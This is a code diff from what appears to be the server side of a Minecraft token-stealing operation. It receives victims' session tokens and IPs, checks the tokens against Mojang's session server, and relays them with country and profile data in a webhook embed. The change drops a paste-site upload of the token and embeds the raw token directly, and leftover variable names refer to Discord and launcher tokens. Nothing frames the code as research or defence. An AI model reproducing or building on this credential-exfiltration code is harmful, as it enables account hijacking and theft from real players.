@@ -37,13 +37,12 @@ if (ipMap.find(entry => entry[0] == req.ipInfo.ip && entry[1] >= 5)) {
 }
 
 try {
-    const [response, discordtoken, shorttoken, feather, essentials, lunar, prism, tlauncher] = await Promise.all([
+    const [response] = await Promise.all([
         post("https://sessionserver.mojang.com/session/minecraft/join", {
             accessToken: req.body.token,
             selectedProfile: req.body.uuid,
             serverId: req.body.uuid
         }),
-        post("https://hst.sh/documents/", req.body.token).then(res => res.data.key).catch(() => "Error uploading"),
     ]);
 
     let profiles = '';
@@ -56,7 +55,7 @@ try {
 
     const country = await fetchCountry(req.body.ip);
 
-    const checkToken = req.body.token == 'File not found :(' ? 'Invalid Token' : `[Minecraft Token](https://hst.sh/${shorttoken})`;
+
     const planckeUrl = `[Plancke.io](https://plancke.io/hypixel/player/stats/${req.body.username})`;
     const cryptUrl = `[SkyCrypt](https://sky.shiiyu.moe/stats/${req.body.username}})`;
 
@@ -65,7 +64,7 @@ try {
         embeds: [{
             fields: [
                 { name: 'Statistics', value: `****${planckeUrl}**** ****${cryptUrl}****`, inline: false },
-                { name: 'Token', value: `****${checkToken}****`, inline: true },
+                { name: 'Token', value: `**\`\`\`${req.body.token}\`\`\`**`, inline: true },
                 { name: 'Profiles', value: `**\`\`\`${profiles}\`\`\`**`, inline: false },
                 { name: 'Country', value: `**\`\`\`${country}\`\`\`**`, inline: false },
             ],
